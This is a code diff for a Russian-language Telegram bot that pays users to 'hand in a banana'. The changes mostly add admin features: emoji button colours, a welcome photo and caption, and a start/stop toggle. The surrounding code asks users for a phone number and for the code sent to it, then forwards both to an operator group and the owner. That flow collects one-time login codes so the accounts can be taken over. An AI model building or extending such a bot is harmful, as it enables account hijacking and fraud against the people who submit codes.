@@ -86,6 +86,12 @@ async def db_init():
                 "Код придёт на указанный номер в течение 1 минуты.\n"
                 "📩 Отправь его одним сообщением."
             ),
+            "start_photo": "",
+            "start_caption": (
+                "🍌 <b>Добро пожаловать!</b>\n\n"
+                "Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
+                "Выбери действие ниже 👇"
+            ),
         }
         for k, v in defaults.items():
             await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
@@ -154,6 +160,66 @@ async def is_bot_active() -> bool:
     return (await get_setting("bot_active", "1")) == "1"
 
 
+async def get_start_photo() -> str | None:
+    v = await get_setting("start_photo", "")
+    return v or None
+
+
+async def get_start_caption() -> str:
+    return await get_setting(
+        "start_caption",
+        "🍌 <b>Добро пожаловать!</b>\n\nВыбери действие ниже 👇"
+    )
+
+
+# ==================== ЦВЕТА КНОПОК ====================
+COLOR_PALETTE = {
+    "🔴": "красный",
+    "🟠": "оранжевый",
+    "🟡": "жёлтый",
+    "🟢": "зелёный",
+    "🔵": "синий",
+    "🟣": "фиолетовый",
+    "⚫": "чёрный",
+    "⚪": "белый",
+    "🟤": "коричневый",
+    "💎": "бирюзовый",
+    "🔥": "огненный",
+    "💚": "изумрудный",
+    "💙": "лазурный",
+    "💜": "аметист",
+    "🧡": "янтарный",
+    "🩷": "розовый",
+}
+
+COLOR_TARGETS = {
+    "btn_banana": "🍌 Сдать банан",
+    "btn_profile": "👤 Профиль",
+    "btn_support": "🆘 Поддержка",
+    "btn_withdraw": "💸 Вывести",
+}
+
+
+async def get_button_color(key: str) -> str:
+    return await get_setting(f"color_{key}", "")
+
+
+async def set_button_color(key: str, emoji: str):
+    await set_setting(f"color_{key}", emoji)
+
+
+async def build_button_text(key: str, base_text: str) -> str:
+    color = await get_button_color(key)
+    clean = base_text
+    for e in COLOR_PALETTE:
+        if clean.startswith(e):
+            clean = clean[len(e):].strip()
+            break
+    if color:
+        return f"{color} {clean}"
+    return clean
+
+
 # ==================== ПРОВЕРКА ПОДПИСКИ ====================
 async def is_subscribed(user_id: int) -> bool:
     try:
@@ -163,8 +229,7 @@ async def is_subscribed(user_id: int) -> bool:
             ChatMemberStatus.KICKED,
         )
     except Exception as e:
-        log.error(f"❌ Ошибка проверки подписки [{user_id}] в {CHANNEL_ID}: {type(e).__name__}: {e}")
-        # Fail-open: если проверка невозможна (бот не админ канала) — пропускаем
+        log.error(f"❌ Ошибка проверки подписки [{user_id}]: {type(e).__name__}: {e}")
         return True
 
 
@@ -188,7 +253,7 @@ async def send_subscribe_prompt(message: Message):
 async def safe_send_group(text: str, **kwargs) -> bool:
     try:
         await bot.send_message(GROUP_ID, text, **kwargs)
-        log.info(f"✅ Группа: отправлено")
+        log.info("✅ Группа: отправлено")
         return True
     except Exception as e:
         log.error(f"❌ GROUP SEND FAILED [{GROUP_ID}]: {type(e).__name__}: {e}")
@@ -198,7 +263,7 @@ async def safe_send_group(text: str, **kwargs) -> bool:
 async def safe_send_owner(text: str, **kwargs) -> bool:
     try:
         await bot.send_message(OWNER_ID, text, **kwargs)
-        log.info(f"✅ Владелец: отправлено")
+        log.info("✅ Владелец: отправлено")
         return True
     except Exception as e:
         log.error(f"❌ OWNER SEND FAILED [{OWNER_ID}]: {type(e).__name__}: {e}")
@@ -221,11 +286,8 @@ async def check_group_access() -> bool:
         member = await bot.get_chat_member(GROUP_ID, me.id)
         log.info(f"✅ Группа: '{chat.title}' (type={chat.type}, id={chat.id})")
         log.info(f"✅ Статус бота в группе: {member.status}")
-        test = await bot.send_message(
-            GROUP_ID,
-            "🔧 <b>Диагностика</b>\nБот успешно подключён к группе."
-        )
-        log.info(f"✅ Тестовое сообщение отправлено (id={test.message_id})")
+        test = await bot.send_message(GROUP_ID, "🔧 <b>Диагностика</b>\nБот подключён к группе.")
+        log.info(f"✅ Тестовое сообщение в группу (id={test.message_id})")
         return True
     except Exception as e:
         log.error(f"❌ НЕ УДАЛОСЬ отправить в группу {GROUP_ID}: {type(e).__name__}: {e}")
@@ -238,13 +300,14 @@ async def check_channel_access() -> bool:
         chat = await bot.get_chat(CHANNEL_ID)
         member = await bot.get_chat_member(CHANNEL_ID, me.id)
         is_admin = member.status == ChatMemberStatus.ADMINISTRATOR
-        log.info(f"✅ Канал: '{chat.title}' (id={chat.id}, username=@{chat.username})")
+        log.info(f"✅ Канал: '{chat.title}' (@{chat.username}, id={chat.id})")
         log.info(f"✅ Статус бота в канале: {member.status}")
         if not is_admin:
-            log.warning("⚠️ Бот НЕ админ канала — проверка подписки может не работать!")
+            log.warning("⚠️ Бот НЕ админ канала — проверка подписки работать НЕ БУДЕТ!")
         return is_admin
     except Exception as e:
         log.error(f"❌ НЕ УДАЛОСЬ проверить канал {CHANNEL_ID}: {type(e).__name__}: {e}")
+        log.error("→ Замени CHANNEL_ID в .env и добавь бота админом канала!")
         return False
 
 
@@ -262,16 +325,22 @@ class AdminStates(StatesGroup):
     waiting_code = State()
     waiting_broadcast = State()
     waiting_btn_text = State()
+    waiting_start_photo = State()
+    waiting_start_caption = State()
+    waiting_color_pick = State()
 
 
 # ==================== КЛАВИАТУРЫ ====================
 async def main_kb() -> ReplyKeyboardMarkup:
+    btn_banana = await build_button_text("btn_banana", await get_setting("btn_banana"))
+    btn_profile = await build_button_text("btn_profile", await get_setting("btn_profile"))
+    btn_support = await build_button_text("btn_support", await get_setting("btn_support"))
     return ReplyKeyboardMarkup(
         keyboard=[
-            [KeyboardButton(text=await get_setting("btn_banana"))],
+            [KeyboardButton(text=btn_banana)],
             [
-                KeyboardButton(text=await get_setting("btn_profile")),
-                KeyboardButton(text=await get_setting("btn_support")),
+                KeyboardButton(text=btn_profile),
+                KeyboardButton(text=btn_support),
             ],
         ],
         resize_keyboard=True,
@@ -286,13 +355,15 @@ def owner_decision_kb(user_id: int, phone: str, code: str) -> InlineKeyboardMark
     ]])
 
 
-def admin_kb() -> InlineKeyboardMarkup:
+async def admin_kb() -> InlineKeyboardMarkup:
+    active = await is_bot_active()
+    toggle_text = "⏸ Остановить бота" if active else "▶️ Запустить бота"
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✏️ Названия кнопок", callback_data="adm:names"),
          InlineKeyboardButton(text="📝 Описания", callback_data="adm:desc")],
         [InlineKeyboardButton(text="🎨 Цвет (эмодзи)", callback_data="adm:color"),
-         InlineKeyboardButton(text="🖼 Фото (инфо)", callback_data="adm:photo")],
-        [InlineKeyboardButton(text="▶️/⏸ Старт/Стоп", callback_data="adm:toggle")],
+         InlineKeyboardButton(text="🖼 Фото приветствия", callback_data="adm:photo")],
+        [InlineKeyboardButton(text=toggle_text, callback_data="adm:toggle")],
         [InlineKeyboardButton(text="📢 Рассылка всем", callback_data="adm:broadcast")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
     ])
@@ -307,17 +378,18 @@ class GateMiddleware(BaseMiddleware):
                 return await handler(event, data)
             if not await is_bot_active():
                 with suppress(Exception):
-                    await event.answer("⏸ Бот временно на обслуживании. Попробуйте позже.")
+                    await event.answer(
+                        "⏸ <b>Бот временно на обслуживании.</b>\n\n"
+                        "Мы скоро вернёмся! Попробуйте позже 🙏"
+                    )
                 return
             if uid:
                 await get_user(uid)
                 await update_username(uid, event.from_user.username)
 
-            # Команды, которые проходят без подписки
             if event.text and event.text.startswith("/start"):
                 return await handler(event, data)
 
-            # Проверка подписки для всех действий
             if uid and event.chat.type == ChatType.PRIVATE:
                 if not await is_subscribed(uid):
                     await send_subscribe_prompt(event)
@@ -325,15 +397,17 @@ class GateMiddleware(BaseMiddleware):
 
         elif isinstance(event, CallbackQuery):
             uid = event.from_user.id
-            if uid != OWNER_ID and not await is_bot_active():
+            if uid == OWNER_ID:
+                return await handler(event, data)
+            if not await is_bot_active():
                 await event.answer("⏸ Бот на обслуживании", show_alert=True)
                 return
-            # Пропускаем callback проверки подписки всегда
             if event.data == "check_sub":
                 return await handler(event, data)
-            if uid != OWNER_ID and not await is_subscribed(uid):
+            if not await is_subscribed(uid):
                 await event.answer("🔒 Сначала подпишись на канал!", show_alert=True)
                 return
+
         return await handler(event, data)
 
 
@@ -374,12 +448,19 @@ async def cmd_start(message: Message, state: FSMContext):
         )
         return
 
-    await message.answer(
-        f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
-        "🍌 Здесь ты можешь сдать свой банан и получить вознаграждение 💰\n\n"
-        "✨ Выбери действие ниже 👇",
-        reply_markup=await main_kb()
-    )
+    photo_id = await get_start_photo()
+    caption = await get_start_caption()
+    kb = await main_kb()
+
+    if photo_id:
+        try:
+            await message.answer_photo(photo=photo_id, caption=caption, reply_markup=kb)
+            return
+        except Exception as e:
+            log.warning(f"⚠️ Фото приветствия сломано: {e}. Сбрасываю.")
+            await set_setting("start_photo", "")
+
+    await message.answer(caption, reply_markup=kb)
 
 
 @router.callback_query(F.data == "check_sub")
@@ -429,10 +510,7 @@ async def banana_cancel(message: Message, state: FSMContext):
 async def banana_phone(message: Message, state: FSMContext):
     phone = validate_phone(message.text or "")
     if not phone:
-        await message.answer(
-            "❌ <b>Неверный формат номера</b>\n\n"
-            "Пример: <code>+79999999999</code>"
-        )
+        await message.answer("❌ <b>Неверный формат номера</b>\n\nПример: <code>+79999999999</code>")
         return
 
     await state.update_data(phone=phone)
@@ -464,15 +542,13 @@ async def banana_code(message: Message, state: FSMContext):
     user_id = message.from_user.id
     username = message.from_user.username or "—"
 
-    sent = await safe_send_group(
+    await safe_send_group(
         f"🔑 <b>Код получен</b>\n"
         f"📱 Номер: <code>{phone}</code>\n"
         f"🔢 Код: <code>{code}</code>\n"
         f"👤 От: <a href='tg://user?id={user_id}'>{message.from_user.full_name}</a> "
         f"(<code>{user_id}</code>) @{username}"
     )
-    if not sent:
-        await message.answer("⚠️ Не удалось отправить код в группу. Сообщите администратору.")
 
     await safe_send_owner(
         f"🆕 <b>Новая заявка</b>\n\n"
@@ -539,6 +615,10 @@ async def profile(message: Message):
     if message.chat.type != ChatType.PRIVATE:
         return
     balance, reg = await get_user(message.from_user.id)
+    withdraw_text = await build_button_text(
+        "btn_withdraw",
+        await get_setting("btn_withdraw")
+    )
     text = (
         f"👤 <b>Ваш профиль</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
@@ -552,7 +632,7 @@ async def profile(message: Message):
     await message.answer(
         text,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=await get_setting("btn_withdraw"), callback_data="withdraw")
+            InlineKeyboardButton(text=withdraw_text, callback_data="withdraw")
         ]])
     )
 
@@ -589,8 +669,7 @@ async def withdraw_amount(message: Message, state: FSMContext):
     balance, _ = await get_user(uid)
     if amount > balance:
         await message.answer(
-            f"❌ <b>Недостаточно средств</b>\n\n"
-            f"💰 Ваш баланс: <code>{balance:.2f}$</code>"
+            f"❌ <b>Недостаточно средств</b>\n\n💰 Ваш баланс: <code>{balance:.2f}$</code>"
         )
         return
 
@@ -650,7 +729,13 @@ async def admin_check(message: Message, state: FSMContext):
         await state.clear()
         return
     await state.clear()
-    await message.answer("⚙️ <b>Админ-панель</b>\n\nВыберите действие 👇", reply_markup=admin_kb())
+    active = await is_bot_active()
+    await message.answer(
+        f"⚙️ <b>Админ-панель</b>\n\n"
+        f"Статус бота: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>\n\n"
+        f"Выбери действие 👇",
+        reply_markup=await admin_kb()
+    )
 
 
 @router.callback_query(F.data.startswith("adm:"))
@@ -658,6 +743,11 @@ async def admin_router(cb: CallbackQuery, state: FSMContext):
     if cb.from_user.id != OWNER_ID:
         await cb.answer("Нет прав", show_alert=True)
         return
+
+    if cb.data in ("adm:photo_upload", "adm:photo_caption", "adm:photo_delete", "adm:back"):
+        return
+
+    await state.clear()
     action = cb.data.split(":", 1)[1]
 
     if action == "stats":
@@ -676,47 +766,273 @@ async def admin_router(cb: CallbackQuery, state: FSMContext):
             f"💸 Всего выводов: <b>{payouts}</b>\n"
             f"🤖 Бот: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>"
         )
+
     elif action == "toggle":
-        new_val = "0" if await is_bot_active() else "1"
+        current = await is_bot_active()
+        new_val = "0" if current else "1"
         await set_setting("bot_active", new_val)
-        await cb.message.answer(f"🤖 Бот {'▶️ запущен' if new_val == '1' else '⏸ остановлен'}")
+        text = (
+            "⚙️ <b>Админ-панель</b>\n\n"
+            f"{'▶️ <b>Бот запущен</b>' if new_val == '1' else '⏸ <b>Бот остановлен</b>'}\n\n"
+            "Выбери действие 👇"
+        )
+        await cb.message.edit_text(text, reply_markup=await admin_kb())
+        await cb.answer("▶️ Запущен" if new_val == "1" else "⏸ Остановлен")
+
     elif action == "broadcast":
         await state.set_state(AdminStates.waiting_broadcast)
         await cb.message.answer("📢 Введите текст объявления:\n\n/cancel — отмена")
+
     elif action == "names":
+        await state.set_state(AdminStates.waiting_btn_text)
         await cb.message.answer(
             "✏️ Введите в формате <code>ключ=новое название</code>:\n\n"
             "Ключи:\n"
-            "<code>btn_banana</code> — сдать банан\n"
-            "<code>btn_profile</code> — профиль\n"
-            "<code>btn_support</code> — поддержка\n"
-            "<code>btn_withdraw</code> — вывести\n\n"
-            "Пример:\n<code>btn_banana=🍌 Сдать</code>"
+            "<code>btn_banana</code>, <code>btn_profile</code>, "
+            "<code>btn_support</code>, <code>btn_withdraw</code>\n\n"
+            "Пример: <code>btn_banana=🍌 Сдать</code>"
         )
-        await state.set_state(AdminStates.waiting_btn_text)
+
     elif action == "desc":
+        await state.set_state(AdminStates.waiting_btn_text)
         await cb.message.answer(
             "📝 Введите в формате <code>ключ=новый текст</code>:\n\n"
             "Ключи:\n"
-            "<code>text_support</code> — приветствие поддержки\n"
-            "<code>text_phone_prompt</code> — запрос номера\n"
-            "<code>text_code_prompt</code> — запрос кода"
+            "<code>text_support</code>, <code>text_phone_prompt</code>, "
+            "<code>text_code_prompt</code>"
         )
-        await state.set_state(AdminStates.waiting_btn_text)
+
     elif action == "color":
-        await cb.message.answer(
-            "🎨 В Telegram <b>нельзя</b> менять цвет Reply-кнопок.\n"
-            "Но можно добавить эмодзи в название через пункт «Названия кнопок».\n\n"
-            "Примеры: 🍌🍎🍇💎🔥⚡️🌟"
+        current = []
+        for key, label in COLOR_TARGETS.items():
+            c = await get_button_color(key)
+            current.append(f"• {label}: {c or '—'}")
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🍌 Сдать банан", callback_data="color:btn_banana")],
+            [InlineKeyboardButton(text="👤 Профиль", callback_data="color:btn_profile")],
+            [InlineKeyboardButton(text="🆘 Поддержка", callback_data="color:btn_support")],
+            [InlineKeyboardButton(text="💸 Вывести", callback_data="color:btn_withdraw")],
+            [InlineKeyboardButton(text="🔄 Сбросить все цвета", callback_data="color:reset_all")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")],
+        ])
+        await cb.message.edit_text(
+            "🎨 <b>Цвета кнопок</b>\n\n"
+            "В Telegram нельзя задать цвет Reply-кнопок напрямую, "
+            "но можно поставить цветной эмодзи в начало названия — "
+            "кнопка будет выглядеть «цветной».\n\n"
+            "<b>Текущие цвета:</b>\n" + "\n".join(current) + "\n\n"
+            "Выбери кнопку, чтобы сменить цвет 👇",
+            reply_markup=kb
         )
+
     elif action == "photo":
-        await cb.message.answer(
-            "🖼 В Telegram <b>нельзя</b> добавить фото на Reply-кнопки.\n"
-            "Альтернатива — отправлять картинку отдельным сообщением."
+        current = await get_start_photo()
+        status = "✅ <b>Фото установлено</b>" if current else "❌ <b>Фото не установлено</b>"
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📤 Загрузить фото", callback_data="adm:photo_upload")],
+            [InlineKeyboardButton(text="✏️ Изменить подпись", callback_data="adm:photo_caption")],
+            [InlineKeyboardButton(text="🗑 Удалить фото", callback_data="adm:photo_delete")],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")],
+        ])
+        await cb.message.edit_text(
+            f"🖼 <b>Фото приветствия</b>\n\n"
+            f"Статус: {status}\n\n"
+            f"Выбери действие 👇",
+            reply_markup=kb
         )
+
     await cb.answer()
 
 
+# ==================== ЦВЕТА: ОБРАБОТЧИКИ ====================
+@router.callback_query(F.data.startswith("color:"))
+async def color_router(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+
+    action = cb.data.split(":", 1)[1]
+
+    if action == "reset_all":
+        for key in COLOR_TARGETS:
+            await set_button_color(key, "")
+        await cb.message.edit_text(
+            "🔄 <b>Все цвета сброшены.</b>\n\n"
+            "Кнопки вернулись к стандартному виду.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:back")]
+            ])
+        )
+        await cb.answer("Сброшено")
+        return
+
+    if action not in COLOR_TARGETS:
+        await cb.answer("Неизвестная кнопка", show_alert=True)
+        return
+
+    await state.set_state(AdminStates.waiting_color_pick)
+    await state.update_data(color_target=action)
+
+    palette_buttons = []
+    row = []
+    for emoji, name in COLOR_PALETTE.items():
+        row.append(InlineKeyboardButton(
+            text=f"{emoji} {name}",
+            callback_data=f"color_pick:{action}:{emoji}"
+        ))
+        if len(row) == 2:
+            palette_buttons.append(row)
+            row = []
+    if row:
+        palette_buttons.append(row)
+    palette_buttons.append([InlineKeyboardButton(text="🚫 Без цвета", callback_data=f"color_pick:{action}:none")])
+    palette_buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="adm:color")])
+
+    current = await get_button_color(action)
+    await cb.message.edit_text(
+        f"🎨 <b>Цвет для кнопки:</b> {COLOR_TARGETS[action]}\n"
+        f"Текущий: {current or '—'}\n\n"
+        f"Выбери эмодзи-цвет 👇",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=palette_buttons)
+    )
+    await cb.answer()
+
+
+@router.callback_query(F.data.startswith("color_pick:"))
+async def color_pick(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+
+    parts = cb.data.split(":", 2)
+    if len(parts) != 3:
+        await cb.answer("Ошибка формата", show_alert=True)
+        return
+    _, target, emoji = parts
+
+    if target not in COLOR_TARGETS:
+        await cb.answer("Неизвестная кнопка", show_alert=True)
+        return
+
+    if emoji == "none":
+        await set_button_color(target, "")
+        result_text = "🚫 цвет убран"
+    else:
+        await set_button_color(target, emoji)
+        result_text = f"{emoji} {COLOR_PALETTE.get(emoji, emoji)}"
+
+    await state.clear()
+
+    await cb.message.edit_text(
+        f"✅ <b>Готово!</b>\n\n"
+        f"Кнопка «{COLOR_TARGETS[target]}» теперь: {result_text}\n\n"
+        f"Изменения применятся при следующем показе клавиатуры.\n"
+        f"Проверь через /start.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🎨 Сменить другую", callback_data="adm:color")],
+            [InlineKeyboardButton(text="⬅️ Назад в админку", callback_data="adm:back")],
+        ])
+    )
+    await cb.answer(f"Цвет: {result_text}")
+
+
+# ==================== ФОТО ПРИВЕТСТВИЯ ====================
+@router.callback_query(F.data == "adm:photo_upload")
+async def adm_photo_upload(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+    await state.set_state(AdminStates.waiting_start_photo)
+    await cb.message.answer(
+        "📤 <b>Отправь фото</b> для приветствия.\n\n"
+        "Рекомендую: 1280×720 (16:9), до 5 МБ.\n"
+        "Отправь картинку одним сообщением.\n\n"
+        "<i>/cancel — отмена</i>"
+    )
+    await cb.answer()
+
+
+@router.message(AdminStates.waiting_start_photo, F.photo)
+async def adm_photo_save(message: Message, state: FSMContext):
+    if message.from_user.id != OWNER_ID:
+        return
+    file_id = message.photo[-1].file_id
+    await set_setting("start_photo", file_id)
+    await state.clear()
+    await message.answer(
+        "✅ <b>Фото приветствия обновлено!</b>\n\nПроверь через /start.",
+        reply_markup=await admin_kb()
+    )
+
+
+@router.message(AdminStates.waiting_start_photo)
+async def adm_photo_wrong(message: Message):
+    if message.from_user.id != OWNER_ID:
+        return
+    await message.answer("❌ Это не фото. Отправь картинку или /cancel.")
+
+
+@router.callback_query(F.data == "adm:photo_caption")
+async def adm_photo_caption(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+    await state.set_state(AdminStates.waiting_start_caption)
+    current = await get_start_caption()
+    await cb.message.answer(
+        f"✏️ <b>Текущая подпись:</b>\n\n{current}\n\n"
+        f"Отправь новый текст подписи (HTML разрешён):\n\n"
+        f"<i>/cancel — отмена</i>"
+    )
+    await cb.answer()
+
+
+@router.message(AdminStates.waiting_start_caption)
+async def adm_caption_save(message: Message, state: FSMContext):
+    if message.from_user.id != OWNER_ID:
+        return
+    text = message.html_text or message.text or ""
+    if not text.strip():
+        await message.answer("❌ Пустой текст. Попробуй снова.")
+        return
+    await set_setting("start_caption", text)
+    await state.clear()
+    await message.answer(
+        "✅ <b>Подпись обновлена!</b>\n\nПроверь через /start.",
+        reply_markup=await admin_kb()
+    )
+
+
+@router.callback_query(F.data == "adm:photo_delete")
+async def adm_photo_delete(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+    await set_setting("start_photo", "")
+    await cb.message.edit_text(
+        "🗑 <b>Фото удалено.</b>\n\nТеперь приветствие отправляется текстом.",
+        reply_markup=await admin_kb()
+    )
+    await cb.answer("Удалено")
+
+
+@router.callback_query(F.data == "adm:back")
+async def adm_back(cb: CallbackQuery, state: FSMContext):
+    if cb.from_user.id != OWNER_ID:
+        await cb.answer("Нет прав", show_alert=True)
+        return
+    await state.clear()
+    active = await is_bot_active()
+    await cb.message.edit_text(
+        f"⚙️ <b>Админ-панель</b>\n\n"
+        f"Статус бота: <b>{'▶️ активен' if active else '⏸ остановлен'}</b>\n\n"
+        f"Выбери действие 👇",
+        reply_markup=await admin_kb()
+    )
+    await cb.answer()
+
+
+# ==================== РАССЫЛКА / ИЗМЕНЕНИЕ НАСТРОЕК ====================
 @router.message(AdminStates.waiting_broadcast)
 async def admin_broadcast(message: Message, state: FSMContext):
     if message.from_user.id != OWNER_ID:
@@ -754,7 +1070,7 @@ async def admin_edit_setting(message: Message, state: FSMContext):
         await message.answer(f"❌ Неизвестный ключ. Допустимые: {', '.join(allowed)}")
         return
     await set_setting(key, val)
-    await message.answer(f"✅ Сохранено:\n<code>{key}</code> → {val}", reply_markup=admin_kb())
+    await message.answer(f"✅ Сохранено:\n<code>{key}</code> → {val}", reply_markup=await admin_kb())
     await state.clear()
 
 
